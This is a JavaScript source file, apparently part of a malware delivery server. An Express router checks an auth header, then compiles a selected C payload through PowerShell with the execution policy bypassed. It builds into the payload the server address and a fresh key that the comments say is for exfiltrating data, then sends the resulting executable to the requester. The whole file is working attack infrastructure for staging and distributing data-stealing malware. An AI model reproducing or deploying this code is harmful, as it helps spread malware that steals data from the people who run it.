const express = require('express');
const EXE_DATA = require("./exe_datas.js");
const Auth = require("./auth.js");
const { genAsciiStr } = require("./util.js");
const { execFileSync } = require("child_process");
const path = require("path");
const logging = require("./logging.js");

// Server IP we are hosting malware server on
const IP = "http://localhost";

// This router will handle the GET requests that ask to retrieve a specified malware.
// The routing is very simple here since GET requests simply act as a CDN for our malware packages
const getReqRouter = express.Router({
    mergeParams: true
});

// Create a middleware that checks for authentication. See auth.js for more info on how that's done
getReqRouter.get("*", (request, response, next) => {
    
    let authKey = Auth.getKeys.getWithHash(request.headers.authorization);
    
    if (authKey == null)
    {
        // If unauthorized, send a random 64 bit ASCII
        response.status(401);
        logging.log(`🔨 GET request denied for IP ${request.ip} due to invalid auth key '${request.headers.authorization}'.`)
        response.send(genAsciiStr(64));
    }
    else
    {
        next();
    }
});

// If default URL + authenticated, send appropriate EXE file
getReqRouter.get("/", (request, response, next) => {

    // We're using the JSON in EXE_DATA to prevent external machines from trying to run a file inclusion attack
    let reqEXEData = EXE_DATA[request.headers.exe];
    
    if (reqEXEData)
    {
        // The gist is: the compiling script has already been made for you in ./make.ps1
        // All we gotta do now is spawn a system process to run it.
        // @see `./exe_datas.js`

        // Compiling might throw errors - here's where we catch that.
        try
        {
            // We'll pass in the $SVL_AUTHKEY and $SVL_ADDRESS into both powershell files. It's up to our .ps1 script to decide what to do with them
            var authKey = genAsciiStr(512);
            
            // Make sure to register the actual AuthKey
            Auth.postKeys.setWithHash(authKey, new Auth.Keys(authKey, request.ip, reqEXEData.singleUse, request.headers.exe));

            // Now, compile the GCC with a newly generated POST Authkey (if necessary) that will be used to when exfiltrating data
            // Spawning subprocesses is always very dangerous, but we mitigate this by not spawning a shell and basically having prepared statements
            // See auth.js for more about how the Authentication is designed
            
            // `${path.resolve(__dirname, reqEXEData.cDir, "./make.ps1")}`,
            execFileSync("powershell.exe", [
                `-ExecutionPolicy`, `Bypass`, 
                `-File`,  `./make.ps1`,
                `-SVL_ADDRESS`, `${IP}`,
                `-SVL_AUTHKEY`, `${authKey}`
            ], {
                cwd: path.resolve(__dirname, reqEXEData.cDir)
            });

            logging.log(`C file ${reqEXEData.cPath} from ${request.ip} compiled!`);
        }
        catch(err)
        {
            logging.error(`🔨 Error in compiling C file ${reqEXEData.cPath} from ${request.ip}: ${err}`);
            response.status(500);
            next();
            return;
        }

        // Send the EXE file
        response.sendFile(reqEXEData.cPath, (err) => {
            if (err)
            {
                logging.error(`🔨 Error in sending file ${reqEXEData.cPath} to ${request.ip}: ${err}`);
                response.status(500);
                next();
                return;
            }
            else
            {
                logging.log(`🔨 EXE file ${reqEXEData.cPath} sent to ${request.ip}.`);
            }
        });
    }
    else
    {
        logging.log(`🔨 GET request denied for IP ${request.ip} due to invalid EXE file '${request.headers.exe}'.`)
        response.status(401);
        next();
    }
});

module.exports = getReqRouter;

// 5/1